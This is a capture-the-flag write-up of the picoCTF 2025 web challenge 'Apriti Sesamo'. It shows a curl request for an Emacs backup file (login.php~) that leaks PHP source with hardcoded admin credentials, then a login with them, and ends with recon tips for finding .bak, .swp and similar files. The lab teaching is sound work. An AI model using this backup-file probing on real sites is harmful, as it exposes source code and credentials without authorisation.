---
title: "Apriti Sesamo — picoCTF 2025"
date: 2025-03-01
tags: [web, backup-files, php, picoctf]
ctf: "picoCTF 2025"
summary: "Source code disclosure via editor backup files (.php~) reveals hardcoded credentials. Emacs autosave naming convention leads directly to auth bypass."
draft: false
---

**Author:** Junias Bonou

## Overview

A web app that "claims to be impossible to hack." Two hints are given:
1. Backup files
2. The lead developer is a militant Emacs user

## Recon

Visiting the target shows a simple login page. Standard recon comes up empty — no obvious injection, no robots.txt hints.

The second hint is the key. Emacs creates backup files by appending a `~` tilde to the filename. If the developer saved `login.php` in Emacs, there's a `login.php~` sitting on the server.

```bash
curl http://target/login.php~
```

This returns the raw PHP source.

## Vulnerability

The backup file contains hardcoded credentials:

```php
$valid_user = "admin";
$valid_pass = "s3cr3t_p4ssw0rd_!@#";
```

## Exploitation

Log in with the hardcoded credentials.

```
Username: admin
Password: s3cr3t_p4ssw0rd_!@#
```

Flag returned on the dashboard.

## Lessons Learned

- Always check for editor backup files: `.php~`, `.bak`, `.swp` (vim), `#file#` (Emacs autosave)
- Gobuster with `-x php~,bak,swp` as extensions is a standard recon step
- Hardcoded credentials in source = instant game over
